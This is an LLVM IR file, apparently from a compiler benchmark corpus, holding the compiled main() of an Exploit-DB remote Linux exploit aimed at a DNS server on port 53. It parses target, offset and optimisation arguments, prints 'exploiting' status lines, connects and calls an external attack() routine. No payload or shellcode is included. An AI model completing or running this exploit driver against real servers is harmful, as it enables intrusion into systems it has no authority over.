; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19112.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19112.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_3__ = type { i8*, i64, i64 }
%struct.sockaddr_in = type { %struct.in_addr, i32, i32 }
%struct.in_addr = type { i8* }
%struct.sockaddr = type { i32 }

@DEFAULT_ANBUF_OFFSET = common dso_local global i64 0, align 8
@DEFAULT_TARGET = common dso_local global i32 0, align 4
@DEFAULT_OPTIMIZED = common dso_local global i32 0, align 4
@target = common dso_local global %struct.TYPE_3__* null, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [16 x i8] c"\0Atarget types:\0A\00", align 1
@.str.1 = private unnamed_addr constant [28 x i8] c" %-2s : %-12s - %-12s - %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"tt\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"anbuf\00", align 1
@.str.4 = private unnamed_addr constant [10 x i8] c"opt anbuf\00", align 1
@.str.5 = private unnamed_addr constant [12 x i8] c"description\00", align 1
@.str.6 = private unnamed_addr constant [32 x i8] c" %-2d : 0x%-10x - 0x%-10x - %s\0A\00", align 1
@.str.7 = private unnamed_addr constant [59 x i8] c"\0Aerror: usage: %s <target> <X server> [tt] [opt] [offset]\0A\00", align 1
@.str.8 = private unnamed_addr constant [31 x i8] c"error: invalid target type %d\0A\00", align 1
@.str.9 = private unnamed_addr constant [23 x i8] c"error: internal error\0A\00", align 1
@.str.10 = private unnamed_addr constant [40 x i8] c"error: invalid optimization setting %d\0A\00", align 1
@.str.11 = private unnamed_addr constant [28 x i8] c"error: can not resolve: %s\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [14 x i8] c"error: socket\00", align 1
@.str.13 = private unnamed_addr constant [15 x i8] c"error: connect\00", align 1
@.str.14 = private unnamed_addr constant [25 x i8] c"target             : %s\0A\00", align 1
@.str.15 = private unnamed_addr constant [25 x i8] c"target type        : %s\0A\00", align 1
@.str.16 = private unnamed_addr constant [25 x i8] c"optimized named    : %s\0A\00", align 1
@.str.17 = private unnamed_addr constant [4 x i8] c"YES\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"NO\00", align 1
@.str.19 = private unnamed_addr constant [27 x i8] c"anbuff addr        : 0x%x\0A\00", align 1
@.str.20 = private unnamed_addr constant [26 x i8] c"anbuff addr offset : %lu\0A\00", align 1
@.str.21 = private unnamed_addr constant [27 x i8] c"xterm display dest : %s:0\0A\00", align 1
@.str.22 = private unnamed_addr constant [18 x i8] c"exploiting . . .\0A\00", align 1
@.str.23 = private unnamed_addr constant [14 x i8] c"error: attack\00", align 1
@.str.24 = private unnamed_addr constant [13 x i8] c"error: close\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.sockaddr_in, align 8
  %12 = alloca %struct.in_addr, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = load i64, i64* @DEFAULT_ANBUF_OFFSET, align 8
  store i64 %13, i64* %6, align 8
  %14 = load i32, i32* @DEFAULT_TARGET, align 4
  store i32 %14, i32* %7, align 4
  %15 = load i32, i32* @DEFAULT_OPTIMIZED, align 4
  store i32 %15, i32* %8, align 4
  store i32 0, i32* %10, align 4
  br label %16

16:                                               ; preds = %27, %2
  %17 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %17, i64 %19
  %21 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %20, i32 0, i32 0
  %22 = load i8*, i8** %21, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = icmp ne i8 %24, 0
  br i1 %25, label %26, label %30

26:                                               ; preds = %16
  br label %27

27:                                               ; preds = %26
  %28 = load i32, i32* %10, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %10, align 4
  br label %16

30:                                               ; preds = %16
  %31 = load i32, i32* %4, align 4
  %32 = icmp slt i32 %31, 3
  br i1 %32, label %33, label %76

33:                                               ; preds = %30
  %34 = load i32, i32* @stderr, align 4
  %35 = call i32 (i32, i8*, ...) @fprintf(i32 %34, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i64 0, i64 0))
  %36 = load i32, i32* @stderr, align 4
  %37 = call i32 (i32, i8*, ...) @fprintf(i32 %36, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %7, align 4
  br label %38

38:                                               ; preds = %66, %33
  %39 = load i32, i32* %7, align 4
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %39, %40
  br i1 %41, label %42, label %69

42:                                               ; preds = %38
  %43 = load i32, i32* @stderr, align 4
  %44 = load i32, i32* %7, align 4
  %45 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %46 = load i32, i32* %7, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %45, i64 %47
  %49 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %48, i32 0, i32 1
  %50 = load i64, i64* %49, align 8
  %51 = trunc i64 %50 to i32
  %52 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %53 = load i32, i32* %7, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %52, i64 %54
  %56 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %55, i32 0, i32 2
  %57 = load i64, i64* %56, align 8
  %58 = trunc i64 %57 to i32
  %59 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %60 = load i32, i32* %7, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %59, i64 %61
  %63 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %62, i32 0, i32 0
  %64 = load i8*, i8** %63, align 8
  %65 = call i32 (i32, i8*, ...) @fprintf(i32 %43, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.6, i64 0, i64 0), i32 %44, i32 %51, i32 %58, i8* %64)
  br label %66

66:                                               ; preds = %42
  %67 = load i32, i32* %7, align 4
  %68 = add nsw i32 %67, 1
  store i32 %68, i32* %7, align 4
  br label %38

69:                                               ; preds = %38
  %70 = load i32, i32* @stderr, align 4
  %71 = load i8**, i8*** %5, align 8
  %72 = getelementptr inbounds i8*, i8** %71, i64 0
  %73 = load i8*, i8** %72, align 8
  %74 = call i32 (i32, i8*, ...) @fprintf(i32 %70, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.7, i64 0, i64 0), i8* %73)
  %75 = call i32 @exit(i32 -1) #3
  unreachable

76:                                               ; preds = %30
  %77 = load i32, i32* %4, align 4
  %78 = icmp sgt i32 %77, 3
  br i1 %78, label %79, label %92

79:                                               ; preds = %76
  %80 = load i8**, i8*** %5, align 8
  %81 = getelementptr inbounds i8*, i8** %80, i64 3
  %82 = load i8*, i8** %81, align 8
  %83 = call i8* @atoi(i8* %82)
  %84 = ptrtoint i8* %83 to i32
  store i32 %84, i32* %7, align 4
  %85 = load i32, i32* %10, align 4
  %86 = icmp sge i32 %84, %85
  br i1 %86, label %87, label %92

87:                                               ; preds = %79
  %88 = load i32, i32* @stderr, align 4
  %89 = load i32, i32* %7, align 4
  %90 = call i32 (i32, i8*, ...) @fprintf(i32 %88, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.8, i64 0, i64 0), i32 %89)
  %91 = call i32 @exit(i32 -1) #3
  unreachable

92:                                               ; preds = %79, %76
  %93 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %94 = load i32, i32* %7, align 4
  %95 = sext i32 %94 to i64
  %96 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %93, i64 %95
  %97 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %96, i32 0, i32 1
  %98 = load i64, i64* %97, align 8
  %99 = icmp eq i64 %98, 0
  br i1 %99, label %100, label %112

100:                                              ; preds = %92
  %101 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %102 = load i32, i32* %7, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %101, i64 %103
  %105 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %104, i32 0, i32 2
  %106 = load i64, i64* %105, align 8
  %107 = icmp eq i64 %106, 0
  br i1 %107, label %108, label %112

108:                                              ; preds = %100
  %109 = load i32, i32* @stderr, align 4
  %110 = call i32 (i32, i8*, ...) @fprintf(i32 %109, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.9, i64 0, i64 0))
  %111 = call i32 @exit(i32 -1) #3
  unreachable

112:                                              ; preds = %100, %92
  %113 = load i32, i32* %4, align 4
  %114 = icmp sgt i32 %113, 4
  br i1 %114, label %115, label %132

115:                                              ; preds = %112
  %116 = load i8**, i8*** %5, align 8
  %117 = getelementptr inbounds i8*, i8** %116, i64 4
  %118 = load i8*, i8** %117, align 8
  %119 = call i8* @atoi(i8* %118)
  %120 = ptrtoint i8* %119 to i32
  store i32 %120, i32* %8, align 4
  %121 = load i32, i32* %8, align 4
  %122 = icmp ne i32 %121, 0
  br i1 %122, label %123, label %131

123:                                              ; preds = %115
  %124 = load i32, i32* %8, align 4
  %125 = icmp ne i32 %124, 1
  br i1 %125, label %126, label %131

126:                                              ; preds = %123
  %127 = load i32, i32* @stderr, align 4
  %128 = load i32, i32* %8, align 4
  %129 = call i32 (i32, i8*, ...) @fprintf(i32 %127, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.10, i64 0, i64 0), i32 %128)
  %130 = call i32 @exit(i32 -1) #3
  unreachable

131:                                              ; preds = %123, %115
  br label %132

132:                                              ; preds = %131, %112
  %133 = load i32, i32* %8, align 4
  %134 = icmp eq i32 %133, 0
  br i1 %134, label %135, label %144

135:                                              ; preds = %132
  %136 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %137 = load i32, i32* %7, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %136, i64 %138
  %140 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %139, i32 0, i32 1
  %141 = load i64, i64* %140, align 8
  %142 = icmp eq i64 %141, 0
  br i1 %142, label %143, label %144

143:                                              ; preds = %135
  store i32 1, i32* %8, align 4
  br label %144

144:                                              ; preds = %143, %135, %132
  %145 = load i32, i32* %8, align 4
  %146 = icmp eq i32 %145, 1
  br i1 %146, label %147, label %156

147:                                              ; preds = %144
  %148 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %149 = load i32, i32* %7, align 4
  %150 = sext i32 %149 to i64
  %151 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %148, i64 %150
  %152 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %151, i32 0, i32 2
  %153 = load i64, i64* %152, align 8
  %154 = icmp eq i64 %153, 0
  br i1 %154, label %155, label %156

155:                                              ; preds = %147
  store i32 0, i32* %8, align 4
  br label %156

156:                                              ; preds = %155, %147, %144
  %157 = load i32, i32* %4, align 4
  %158 = icmp sgt i32 %157, 5
  br i1 %158, label %159, label %165

159:                                              ; preds = %156
  %160 = load i8**, i8*** %5, align 8
  %161 = getelementptr inbounds i8*, i8** %160, i64 5
  %162 = load i8*, i8** %161, align 8
  %163 = call i8* @atoi(i8* %162)
  %164 = ptrtoint i8* %163 to i64
  store i64 %164, i64* %6, align 8
  br label %165

165:                                              ; preds = %159, %156
  %166 = load i8**, i8*** %5, align 8
  %167 = getelementptr inbounds i8*, i8** %166, i64 2
  %168 = load i8*, i8** %167, align 8
  %169 = call i8* @resolve(i8* %168)
  %170 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %12, i32 0, i32 0
  store i8* %169, i8** %170, align 8
  %171 = icmp ne i8* %169, null
  br i1 %171, label %179, label %172

172:                                              ; preds = %165
  %173 = load i32, i32* @stderr, align 4
  %174 = load i8**, i8*** %5, align 8
  %175 = getelementptr inbounds i8*, i8** %174, i64 2
  %176 = load i8*, i8** %175, align 8
  %177 = call i32 (i32, i8*, ...) @fprintf(i32 %173, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.11, i64 0, i64 0), i8* %176)
  %178 = call i32 @exit(i32 -1) #3
  unreachable

179:                                              ; preds = %165
  %180 = load i8**, i8*** %5, align 8
  %181 = getelementptr inbounds i8*, i8** %180, i64 1
  %182 = load i8*, i8** %181, align 8
  %183 = call i8* @resolve(i8* %182)
  %184 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  %185 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %184, i32 0, i32 0
  store i8* %183, i8** %185, align 8
  %186 = icmp ne i8* %183, null
  br i1 %186, label %194, label %187

187:                                              ; preds = %179
  %188 = load i32, i32* @stderr, align 4
  %189 = load i8**, i8*** %5, align 8
  %190 = getelementptr inbounds i8*, i8** %189, i64 1
  %191 = load i8*, i8** %190, align 8
  %192 = call i32 (i32, i8*, ...) @fprintf(i32 %188, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.11, i64 0, i64 0), i8* %191)
  %193 = call i32 @exit(i32 -1) #3
  unreachable

194:                                              ; preds = %179
  %195 = load i32, i32* @AF_INET, align 4
  %196 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  store i32 %195, i32* %196, align 8
  %197 = call i32 @htons(i32 53)
  %198 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 2
  store i32 %197, i32* %198, align 4
  %199 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 1
  %200 = load i32, i32* %199, align 8
  %201 = load i32, i32* @SOCK_STREAM, align 4
  %202 = load i32, i32* @IPPROTO_TCP, align 4
  %203 = call i32 @socket(i32 %200, i32 %201, i32 %202)
  store i32 %203, i32* %9, align 4
  %204 = icmp eq i32 %203, -1
  br i1 %204, label %205, label %208

205:                                              ; preds = %194
  %206 = call i32 @perror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.12, i64 0, i64 0))
  %207 = call i32 @exit(i32 -1) #3
  unreachable

208:                                              ; preds = %194
  %209 = load i32, i32* %9, align 4
  %210 = bitcast %struct.sockaddr_in* %11 to %struct.sockaddr*
  %211 = call i32 @connect(i32 %209, %struct.sockaddr* %210, i32 16)
  %212 = icmp eq i32 %211, -1
  br i1 %212, label %213, label %216

213:                                              ; preds = %208
  %214 = call i32 @perror(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.13, i64 0, i64 0))
  %215 = call i32 @exit(i32 -1) #3
  unreachable

216:                                              ; preds = %208
  %217 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %11, i32 0, i32 0
  %218 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %217, i32 0, i32 0
  %219 = load i8*, i8** %218, align 8
  %220 = call i8* @inet_ntoa(i8* %219)
  %221 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.14, i64 0, i64 0), i8* %220)
  %222 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %223 = load i32, i32* %7, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %222, i64 %224
  %226 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %225, i32 0, i32 0
  %227 = load i8*, i8** %226, align 8
  %228 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.15, i64 0, i64 0), i8* %227)
  %229 = load i32, i32* %8, align 4
  %230 = icmp ne i32 %229, 0
  %231 = zext i1 %230 to i64
  %232 = select i1 %230, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.17, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.18, i64 0, i64 0)
  %233 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.16, i64 0, i64 0), i8* %232)
  %234 = load i32, i32* %8, align 4
  %235 = icmp ne i32 %234, 0
  br i1 %235, label %236, label %243

236:                                              ; preds = %216
  %237 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %238 = load i32, i32* %7, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %237, i64 %239
  %241 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %240, i32 0, i32 2
  %242 = load i64, i64* %241, align 8
  br label %250

243:                                              ; preds = %216
  %244 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %245 = load i32, i32* %7, align 4
  %246 = sext i32 %245 to i64
  %247 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %244, i64 %246
  %248 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %247, i32 0, i32 1
  %249 = load i64, i64* %248, align 8
  br label %250

250:                                              ; preds = %243, %236
  %251 = phi i64 [ %242, %236 ], [ %249, %243 ]
  %252 = trunc i64 %251 to i32
  %253 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.19, i64 0, i64 0), i32 %252)
  %254 = load i64, i64* %6, align 8
  %255 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.20, i64 0, i64 0), i64 %254)
  %256 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %12, i32 0, i32 0
  %257 = load i8*, i8** %256, align 8
  %258 = call i8* @inet_ntoa(i8* %257)
  %259 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.21, i64 0, i64 0), i8* %258)
  %260 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.22, i64 0, i64 0))
  %261 = load i32, i32* %9, align 4
  %262 = load %struct.TYPE_3__*, %struct.TYPE_3__** @target, align 8
  %263 = load i32, i32* %7, align 4
  %264 = sext i32 %263 to i64
  %265 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %262, i64 %264
  %266 = load i64, i64* %6, align 8
  %267 = load i32, i32* %8, align 4
  %268 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %12, i32 0, i32 0
  %269 = load i8*, i8** %268, align 8
  %270 = call i32 @attack(i32 %261, i8* %269, %struct.TYPE_3__* byval(%struct.TYPE_3__) align 8 %265, i64 %266, i32 %267)
  switch i32 %270, label %276 [
    i32 -1, label %271
    i32 0, label %273
  ]

271:                                              ; preds = %250
  %272 = call i32 @perror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.23, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %284

273:                                              ; preds = %250
  %274 = load i32, i32* @stderr, align 4
  %275 = call i32 (i32, i8*, ...) @fprintf(i32 %274, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.9, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %284

276:                                              ; preds = %250
  %277 = load i32, i32* %9, align 4
  %278 = call i64 @close(i32 %277)
  %279 = icmp ne i64 %278, 0
  br i1 %279, label %280, label %282

280:                                              ; preds = %276
  %281 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.24, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %284

282:                                              ; preds = %276
  %283 = call i32 @exit(i32 0) #3
  unreachable

284:                                              ; preds = %280, %273, %271
  %285 = load i32, i32* %3, align 4
  ret i32 %285
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i8* @atoi(i8*) #1

declare dso_local i8* @resolve(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @inet_ntoa(i8*) #1

declare dso_local i32 @attack(i32, i8*, %struct.TYPE_3__* byval(%struct.TYPE_3__) align 8, i64, i32) #1

declare dso_local i64 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
